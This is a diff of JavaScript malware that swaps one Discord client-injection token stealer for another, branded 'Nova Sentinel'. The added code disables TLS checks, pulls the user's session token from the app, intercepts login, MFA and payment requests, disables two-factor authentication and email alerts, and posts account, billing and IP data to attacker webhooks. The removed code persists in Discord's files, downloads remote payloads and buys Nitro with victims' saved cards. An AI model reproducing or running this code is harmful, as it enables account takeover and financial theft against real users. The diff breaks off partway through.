@@ -1,970 +1,2676 @@
-const args = process.argv;
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
-const querystring = require('querystring');
-const { BrowserWindow, session } = require('electron');
+module.exports = require("./core.asar");
+process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
 
-const config = {
-  webhook: '%WEBHOOK%',
-  webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false, 
-  ping_on_run: true, 
-  ping_val: '@everyone', 
-  embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
-  embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+const fs = require("fs");
+const electron = require("electron");
+const https = require("https");
+const queryString = require("querystring");
 
-  api: 'https://discord.com/api/v9/users/@me',
-  nitro: {
-    boost: {
-      year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
-        price: '9999',
-      },
-      month: {
-        id: '521847234246082599',
-        sku: '511651880837840896',
-        price: '999',
-      },
-    },
-    classic: {
-      month: {
-        id: '521846918637420545',
-        sku: '511651871736201216',
-        price: '499',
-      },
-    },
-  },
-  filter: {
+var computerName = process.env.COMPUTERNAME;
+let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`;
+var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
+var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
+var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;
+
+var config = {
+  logout: "true",
+  "logout-notify": "true",
+  "init-notify": "true",
+  "embed-color": 3553599,
+  disable2FA: "%DISABLEFA%",
+  changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
+  mail: "%CLIENTEMAIL%",
+  creator: "%NAME_CREATOR%",
+  transfer_link: `%TRANSFER_URL%`,
+  injection_url:
+    "https://raw.githubusercontent.com/allahyok112233/allahyok112233/main/index.js",
+  webhook: "%WEBHOOK%",
+  Placed: "%API_URL%",
+  Filter: {
     urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://*.discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://discord.com/api/v*/auth/login',
-      'https://*.discord.com/api/v*/auth/login',
-      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-      'https://api.stripe.com/v*/tokens',
-      'https://api.stripe.com/v*/setup_intents/*/confirm',
-      'https://api.stripe.com/v*/payment_intents/*/confirm',
+      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+      "https://*.discord.com/api/v*/applications/detectable",
+      "https://discord.com/api/v*/applications/detectable",
+      "https://*.discord.com/api/v*/users/@me/library",
+      "https://discord.com/api/v*/users/@me/library",
+      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+      "https://discord.com/api/v*/users/@me/billing/subscriptions",
+      "wss://remote-auth-gateway.discord.gg/*",
     ],
   },
-  filter2: {
+  onCompleted: {
     urls: [
-      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-      'https://*.discord.com/api/v*/applications/detectable',
-      'https://discord.com/api/v*/applications/detectable',
-      'https://*.discord.com/api/v*/users/@me/library',
-      'https://discord.com/api/v*/users/@me/library',
-      'wss://remote-auth-gateway.discord.gg/*',
+      "https://discord.com/api/v9/auth/mfa/totp",
+      "https://discord.com/api/v*/users/@me",
+      "https://discordapp.com/api/v*/users/@me",
+      "https://*.discord.com/api/v*/users/@me",
+      "https://discordapp.com/api/v*/auth/login",
+      "https://discord.com/api/v*/auth/login",
+      "https://*.discord.com/api/v*/auth/login",
+      "https://api.stripe.com/v*/tokens",
+      "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+      "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
+      "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
+      "https://discord.com/api/v*/users/@me/mfa/sms/enable",
+      "https://discord.com/api/v*/users/@me/mfa/sms/disable",
+      "https://discord.com/api/v*/users/@me/mfa/totp/disable",
+      "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
+      "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
+      "https://discord.com/api/v*/users/@me/mfa/codes-verification",
+      "https://*.discord.com/api/v*/users/@me/mfa/codes-verification",
+      "https://discordapp.com/api/v*/users/@me/mfa/codes-verification",
+    ],
+  },
+  onCompletedbis: {
+    urls: [
+      "https://discord.com/api/v9/auth/mfa/totp",
+      "https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address",
     ],
   },
 };
 
-function parity_32(x, y, z) {
-  return x ^ y ^ z;
-}
-function ch_32(x, y, z) {
-  return (x & y) ^ (~x & z);
-}
-
-function maj_32(x, y, z) {
-  return (x & y) ^ (x & z) ^ (y & z);
-}
-function rotl_32(x, n) {
-  return (x << n) | (x >>> (32 - n));
-}
-function safeAdd_32_2(a, b) {
-  var lsw = (a & 0xffff) + (b & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function safeAdd_32_5(a, b, c, d, e) {
-  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function binb2hex(binarray) {
-  var hex_tab = '0123456789abcdef',
-    str = '',
-    length = binarray.length * 4,
-    i,
-    srcByte;
-
-  for (i = 0; i < length; i += 1) {
-    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
-    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
-  }
-
-  return str;
+async function execScript(str) {
+  var window = electron.BrowserWindow.getAllWindows()[0];
+  var script = await window.webContents.executeJavaScript(str, true);
+  return script || null;
 }
 
-function getH() {
-  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
-}
-function roundSHA1(block, H) {
-  var W = [],
-    a,
-    b,
-    c,
-    d,
-    e,
-    T,
-    ch = ch_32,
-    parity = parity_32,
-    maj = maj_32,
-    rotl = rotl_32,
-    safeAdd_2 = safeAdd_32_2,
-    t,
-    safeAdd_5 = safeAdd_32_5;
-
-  a = H[0];
-  b = H[1];
-  c = H[2];
-  d = H[3];
-  e = H[4];
-
-  for (t = 0; t < 80; t += 1) {
-    if (t < 16) {
-      W[t] = block[t];
-    } else {
-      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
-    }
-
-    if (t < 20) {
-      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
-    } else if (t < 40) {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
-    } else if (t < 60) {
-      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
-    } else {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
-    }
-
-    e = d;
-    d = c;
-    c = rotl(b, 30);
-    b = a;
-    a = T;
-  }
-
-  H[0] = safeAdd_2(a, H[0]);
-  H[1] = safeAdd_2(b, H[1]);
-  H[2] = safeAdd_2(c, H[2]);
-  H[3] = safeAdd_2(d, H[3]);
-  H[4] = safeAdd_2(e, H[4]);
-
-  return H;
-}
-
-function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
-  var i, appendedMessageLength, offset;
-
-  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
-  while (remainder.length <= offset) {
-    remainder.push(0);
-  }
-  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
-  remainder[offset] = remainderBinLen + processedBinLen;
-  appendedMessageLength = remainder.length;
-
-  for (i = 0; i < appendedMessageLength; i += 16) {
-    H = roundSHA1(remainder.slice(i, i + 16), H);
-  }
-  return H;
-}
-
-function hex2binb(str, existingBin, existingBinLen) {
-  var bin,
-    length = str.length,
-    i,
-    num,
-    intOffset,
-    byteOffset,
-    existingByteLen;
-
-  bin = existingBin || [0];
-  existingBinLen = existingBinLen || 0;
-  existingByteLen = existingBinLen >>> 3;
-
-  if (0 !== length % 2) {
-    console.error('String of HEX type must be in byte increments');
-  }
-
-  for (i = 0; i < length; i += 2) {
-    num = parseInt(str.substr(i, 2), 16);
-    if (!isNaN(num)) {
-      byteOffset = (i >>> 1) + existingByteLen;
-      intOffset = byteOffset >>> 2;
-      while (bin.length <= intOffset) {
-        bin.push(0);
-      }
-      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
-    } else {
-      console.error('String of HEX type contains invalid characters');
-    }
-  }
-
-  return { value: bin, binLen: length * 4 + existingBinLen };
-}
-
-class jsSHA {
-  constructor() {
-    var processedLen = 0,
-      remainder = [],
-      remainderLen = 0,
-      intermediateH,
-      converterFunc,
-      outputBinLen,
-      variantBlockSize,
-      roundFunc,
-      finalizeFunc,
-      finalized = false,
-      hmacKeySet = false,
-      keyWithIPad = [],
-      keyWithOPad = [],
-      numRounds,
-      numRounds = 1;
-
-    converterFunc = hex2binb;
-
-    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
-      console.error('numRounds must a integer >= 1');
-    }
-    variantBlockSize = 512;
-    roundFunc = roundSHA1;
-    finalizeFunc = finalizeSHA1;
-    outputBinLen = 160;
-    intermediateH = getH();
-
-    this.setHMACKey = function (key) {
-      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
-      keyConverterFunc = hex2binb;
-      convertRet = keyConverterFunc(key);
-      keyBinLen = convertRet['binLen'];
-      keyToUse = convertRet['value'];
-      blockByteSize = variantBlockSize >>> 3;
-      lastArrayIndex = blockByteSize / 4 - 1;
-
-      if (blockByteSize < keyBinLen / 8) {
-        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
-        }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      } else if (blockByteSize > keyBinLen / 8) {
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
-        }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      }
-
-      for (i = 0; i <= lastArrayIndex; i += 1) {
-        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
-        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
-      }
-
-      intermediateH = roundFunc(keyWithIPad, intermediateH);
-      processedLen = variantBlockSize;
-
-      hmacKeySet = true;
-    };
-
-    this.update = function (srcString) {
-      var convertRet,
-        chunkBinLen,
-        chunkIntLen,
-        chunk,
-        i,
-        updateProcessedLen = 0,
-        variantBlockIntInc = variantBlockSize >>> 5;
-
-      convertRet = converterFunc(srcString, remainder, remainderLen);
-      chunkBinLen = convertRet['binLen'];
-      chunk = convertRet['value'];
-
-      chunkIntLen = chunkBinLen >>> 5;
-      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
-        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
-          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
-          updateProcessedLen += variantBlockSize;
-        }
-      }
-      processedLen += updateProcessedLen;
-      remainder = chunk.slice(updateProcessedLen >>> 5);
-      remainderLen = chunkBinLen % variantBlockSize;
-    };
-
-    this.getHMAC = function () {
-      var firstHash;
-
-      if (false === hmacKeySet) {
-        console.error('Cannot call getHMAC without first setting HMAC key');
-      }
-
-      const formatFunc = function (binarray) {
-        return binb2hex(binarray);
-      };
-
-      if (false === finalized) {
-        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
-        intermediateH = roundFunc(keyWithOPad, getH());
-        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
-      }
-
-      finalized = true;
-      return formatFunc(intermediateH);
-    };
-  }
-}
-
-if ('function' === typeof define && define['amd']) {
-  define(function () {
-    return jsSHA;
-  });
-} else if ('undefined' !== typeof exports) {
-  if ('undefined' !== typeof module && module['exports']) {
-    module['exports'] = exports = jsSHA;
-  } else {
-    exports = jsSHA;
-  }
-} else {
-  global['jsSHA'] = jsSHA;
-}
-
-if (jsSHA.default) {
-  jsSHA = jsSHA.default;
-}
-
-function totp(key) {
-  const period = 30;
-  const digits = 6;
-  const timestamp = Date.now();
-  const epoch = Math.round(timestamp / 1000.0);
-  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
-  const shaObj = new jsSHA();
-  shaObj.setHMACKey(base32tohex(key));
-  shaObj.update(time);
-  const hmac = shaObj.getHMAC();
-  const offset = hex2dec(hmac.substring(hmac.length - 1));
-  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
-  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
-  return otp;
-}
-
-function hex2dec(s) {
-  return parseInt(s, 16);
-}
-
-function dec2hex(s) {
-  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
-}
-
-function base32tohex(base32) {
-  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
-    bits = '',
-    hex = '';
-
-  base32 = base32.replace(/=+$/, '');
-
-  for (let i = 0; i < base32.length; i++) {
-    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
-    if (val === -1) console.error('Invalid base32 character in key');
-    bits += leftpad(val.toString(2), 5, '0');
-  }
-
-  for (let i = 0; i + 8 <= bits.length; i += 8) {
-    let chunk = bits.substr(i, 8);
-    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
-  }
-  return hex;
-}
-
-function leftpad(str, len, pad) {
-  if (len + 1 >= str.length) {
-    str = Array(len + 1 - str.length).join(pad) + str;
-  }
-  return str;
-}
-
-const discordPath = (function () {
-  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
-  let resourcePath;
-
-  if (process.platform === 'win32') {
-    resourcePath = path.join(app, 'resources');
-  } else if (process.platform === 'darwin') {
-    resourcePath = path.join(app, 'Contents', 'Resources');
-  }
-
-  if (fs.existsSync(resourcePath)) return { resourcePath, app };
-  return { undefined, undefined };
-})();
-
-function updateCheck() {
-  const { resourcePath, app } = discordPath;
-  if (resourcePath === undefined || app === undefined) return;
-  const appPath = path.join(resourcePath, 'app');
-  const packageJson = path.join(appPath, 'package.json');
-  const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
-  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
-  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-  if (process.platform === 'win32' || process.platform === 'darwin') {
-    fs.writeFileSync(
-      packageJson,
-      JSON.stringify(
-        {
-          name: 'discord',
-          main: 'index.js',
+const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
+  var params = {
+    username: "Nova Sentinel",
+    avatar_url:
+      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png",
+    content: "",
+    embeds: [
+      {
+        title: title,
+        color: config["embed-color"],
+        fields: fields,
+        description: description ?? "",
+        author: {
+          name: `Nova Sentinel`,
         },
-        null,
-        4,
-      ),
-    );
 
-    const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs}';
-const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
-    
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
+        footer: {
+          text: ` [${config.creator}] | https://t.me/Sordeal`,
+        },
+      },
+    ],
+  };
+
+  if (image)
+    params.embeds[0].image = {
+      url: image,
+    };
+  if (thumbnail)
+    params.embeds[0].thumbnail = {
+      url: thumbnail,
+    };
+  return params;
+};
+
+const getIP = () => {
+  return new Promise((resolve, reject) => {
+    const options = {
+      hostname: "api.ipify.org",
+      path: "/?format=json",
+      method: "GET",
+    };
+
+    const req = https.request(options, (res) => {
+      let data = "";
+
+      res.on("data", (chunk) => {
+        data += chunk;
+      });
+
+      res.on("end", () => {
+        const json = JSON.parse(data);
+        resolve(json.ip);
+      });
     });
-}
-require('${path.join(resourcePath, 'app.asar')}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
-  }
-  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
-  fs.rmdirSync(path.join(__dirname, 'initiation'));
-  execScript(
-    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
+
+    req.on("error", (error) => {
+      reject(error);
+    });
+
+    req.end();
+  });
+};
+
+const getURL = async (url, token) => {
+  var c = await execScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "${url}", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        JSON.parse(xmlHttp.responseText);`);
+  return c;
+};
+
+const getGifOrPNG = async (url) => {
+  var tt = [".gif?size=512", ".png?size=512"];
+
+  var headers = await new Promise((resolve) => {
+    https.get(url, (res) => resolve(res.headers));
+  });
+  var type = headers["content-type"];
+  if (type == "image/gif") return url + tt[0];
+  else return url + tt[1];
+};
+
+const GetBadges = (e) => {
+  var n = "";
+  return (
+    1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
+    2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
+    4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
+    8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
+    64 == (64 & e) && (n += "<:bravery:874750808388952075> "),
+    128 == (128 & e) && (n += "<:brilliance:874750808338608199> "),
+    256 == (256 & e) && (n += "<:balance:874750808267292683> "),
+    512 == (512 & e) && (n += "<:666_hackingmyshit:1143858319824527400> "),
+    16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
+    4194304 == (4194304 & e) && (n += "<:activedev:1143858315886088263> "),
+    131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
+    "" == n && (n = ":x:"),
+    n
   );
-  return !1;
-}
-
-const execScript = (script) => {
-  const window = BrowserWindow.getAllWindows()[0];
-  return window.webContents.executeJavaScript(script, !0);
+};
+const GetRBadges = (e) => {
+  var n = "";
+  return (
+    1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
+    2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
+    4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
+    8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
+    512 == (512 & e) && (n += "<:early:944071770506416198> "),
+    16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
+    131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
+    "" == n && (n = ":x:"),
+    n
+  );
 };
 
-const getInfo = async (token) => {
-  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "${config.api}", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(null);
-    xmlHttp.responseText;`);
-  return JSON.parse(info);
+const GetNSFW = (bouki) => {
+  switch (bouki) {
+    case true:
+      return ":underage: `NSFW Allowed`";
+    case false:
+      return ":underage: `NSFW Not Allowed`";
+    default:
+      return "Idk bro you got me";
+  }
+};
+const GetA2F = (bouki) => {
+  switch (bouki) {
+    case true:
+      return ":lock: `A2F Enabled`";
+    case false:
+      return ":lock: `A2F Not Enabled`";
+    default:
+      return "Idk bro you got me";
+  }
 };
 
-const fetchBilling = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
-    xmlHttp.setRequestHeader("Authorization", "${token}"); 
-    xmlHttp.send(null); 
-    xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return '';
-  return JSON.parse(bill);
+const parseFriends = (friends) => {
+  try {
+    var real = friends.filter((x) => x.type == 1);
+    var rareFriends = "";
+    for (var friend of real) {
+      var badges = GetRBadges(friend.user.public_flags);
+      if (badges !== ":x:")
+        rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends";
+    return {
+      len: real.length,
+      badges: rareFriends,
+    };
+  } catch (err) {
+    return ":x:";
+  }
 };
 
-const getBilling = async (token) => {
-  const data = await fetchBilling(token);
-  if (!data) return '❌';
-  let billing = '';
-  data.forEach((x) => {
-    if (!x.invalid) {
-      switch (x.type) {
+const parseBilling = (billings) => {
+  var Billings = "";
+  try {
+    if (!billings) return (Billings = ":x:");
+    billings.forEach((res) => {
+      if (res.invalid) return;
+      switch (res.type) {
         case 1:
-          billing += '💳 ';
+          Billings += ":heavy_check_mark: :credit_card:";
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
-          break;
+          Billings += ":heavy_check_mark: <:paypal:896441236062347374>";
       }
-    }
-  });
-  if (!billing) billing = '❌';
-  return billing;
+    });
+    if (!Billings) Billings = ":x:";
+    return Billings;
+  } catch (err) {
+    return ":x:";
+  }
 };
 
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
+const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));
+
+function generateId(len) {
+  var text = "";
+  var possible = "0123456789";
+  for (var i = 0; i < len; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+  return text;
+}
+
+function remove2FA(token, code) {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      code,
+    });
+    const options = {
+      hostname: "discord.com",
+      port: 443,
+      path: "/api/v9/users/@me/mfa/totp/disable",
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: token,
+      },
+    };
+    const req = https.request(options, (res) => {
+      let responseData = "";
+      res.on("data", (chunk) => {
+        responseData += chunk;
+      });
+      res.on("end", () => {
+        resolve(responseData);
+      });
+    });
+    req.on("error", (error) => {
+      reject(error.message);
+    });
+    req.write(data);
+    req.end();
+  });
+}
+const GetNitro = (r) => {
+  if (!r.premium_type) return ":x:";
+  switch (r.premium_type) {
+    default:
+      return ":x:";
+    case 1:
+      return "<:946246402105819216:962747802797113365>";
+    case 2:
+      if (!r.premium_guild_since)
+        return "<:946246402105819216:962747802797113365>";
+      var now = new Date(Date.now());
+      var arr = [
+        "<:Booster1Month:1051453771147911208>",
+        "<:Booster2Month:1051453772360077374>",
+        "<:Booster6Month:1051453773463162890>",
+        "<:Booster9Month:1051453774620803122>",
+        "<:boost12month:1068308256088400004>",
+        "<:Booster15Month:1051453775832961034>",
+        "<:BoosterLevel8:1051453778127237180>",
+        "<:Booster24Month:1051453776889917530>",
+      ];
+      var a = [
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+        new Date(r.premium_guild_since),
+      ];
+      var b = [2, 3, 6, 9, 12, 15, 18, 24];
+      var r = [];
+      for (var p in a)
+        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
+      var i = 0;
+      for (var p of r) p > 0 ? "" : i++;
+      return "<:946246402105819216:962747802797113365> " + arr[i];
+  }
+};
+
+function GetLangue(read) {
+  var languages = {
+    fr: ":flag_fr: French",
+    pt: ":flag_pt: Portuguese",
+    da: ":flag_dk: Dansk",
+    de: ":flag_de: Deutsch",
+    "en-GB": ":england: English (UK)",
+    "en-US": ":flag_us: USA",
+    "en-ES": ":flag_es: Espagnol",
+    hr: ":flag_hr: Croatian",
+    it: ":flag_it: Italianio",
+    lt: ":flag_lt: Lithuanian",
+    hu: ":flag_no::flag_hu: Hungarian",
+    no: ":flag_no: Norwegian",
+    pl: ":flag_pl: Polish",
+    "pr-BR": ":flag_pt: Portuguese",
+    ro: ":flag_ro: Romanian",
+    fi: ":flag_fi: Finnish",
+    "sv-SE": ":flag_se: Swedish",
+    vi: ":flag_vn: Vietnamese",
+    tr: ":flag_tr: Turkish",
+    cs: ":flag_cz: Czech",
+    el: ":flag_gr: Greek",
+    bg: ":flag_bg: Bulgarian",
+    ru: ":flag_ru: Russian",
+    uk: ":flag_ua: Ukrainian",
+    hi: ":flag_in: Indian",
+    th: ":flag_tw: Taiwanese",
+    "zh-CN": ":flag_cn: Chinese-China",
+    ja: ":flag_jp: Japanese",
+    "zh-TW": ":flag_cn: Chinese-Taiwanese",
+    ko: ":flag_kr: Korean",
   };
 
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-    xmlHttp.responseText`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
+  var langue = languages[read] || ":flag_us: USA";
+  return langue;
+}
+const post = async (params) => {
+  params = JSON.stringify(params);
+  var token = await execScript(tokenScript);
+  var n = JSON.stringify({
+    data: params,
+    token: token,
+  });
+  [config.Placed, config.webhook].forEach((res) => {
+    if (res == "%API" + "_URL%") return;
+    if (res == "%\x57EBHOOK%") return;
+    const url = new URL(res);
+    const options = {
+      host: url.hostname,
+      port: url.port,
+      path: url.pathname,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
+    const req = https.request(options);
+    req.on("error", (err) => {});
+    req.write(res == config.Placed ? n : params);
+    req.end();
+  });
 };
 
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
-  if (!data) return failedMsg;
+const disablenoti = async () => {
+  var token = await execScript(tokenScript);
+  const data = {
+    email_notifications_disabled: true,
+  };
 
-  let IDS = [];
-  data.forEach((x) => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
+  const postData = JSON.stringify(data);
+
+  const options = {
+    hostname: "discord.com",
+    path: "/api/v9/users/@me/settings",
+    method: "PATCH",
+    headers: {
+      Authorization: `${token}`,
+      "Content-Type": "application/json",
+      "Content-Length": postData.length,
+    },
+  };
+
+  const req = https.request(options, (res) => {
+    if (res.statusCode === 200) {
     } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
-        }
-      }
     }
-  }
-};
-
-const getNitro = (flags) => {
-  switch (flags) {
-    case 0:
-      return 'No Nitro';
-    case 1:
-      return 'Nitro Classic';
-    case 2:
-      return 'Nitro Boost';
-    default:
-      return 'No Nitro';
-  }
-};
-
-const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
